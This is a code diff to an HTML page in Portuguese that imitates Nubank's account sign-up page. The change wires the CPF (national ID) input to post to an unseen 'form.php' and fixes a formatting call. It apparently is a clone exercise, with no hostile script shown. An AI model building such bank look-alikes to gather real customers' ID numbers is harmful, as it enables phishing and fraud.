@@ -49,16 +49,17 @@
             <h1 style="font-size: 30px;width: 250px; margin-bottom: 10px;">Tenha N Possibilidades de produtos para N Possibilidades na vida</h1>
             <p style="font-size: 20px;width: 300px;">O que você precisa pra ficar no controle da sua vida financeira tem no app do Nubank.</p>
         </div>
-        <form>
-            <h1 style="width: 200px;font-size: 18px;">Peça sua conta e cartão de crédito do Nubank</h1>
+        <form method="post" action="form.php">
+            <h1>Peça sua conta e cartão de crédito do Nubank</h1>
             <div id="input-cpf">
-                <input type="text" maxlength="11" onkeypress="formatar('###-###-###-##'), this" placeholder="Digite seu CPF">
+                <input type="text" name="cpf" maxlength="11" onkeypress="formatar('###-###-###-##', this)" placeholder="Digite seu CPF">
                 <hr>
             </div>
             <div id="submit-cpf">
+                <input type="hidden" name="continuar" value="1">
                 <input type="submit" value="Continuar">
             </div>
-        </form>
+        </form>        
     </main>
 </body>
 </html>
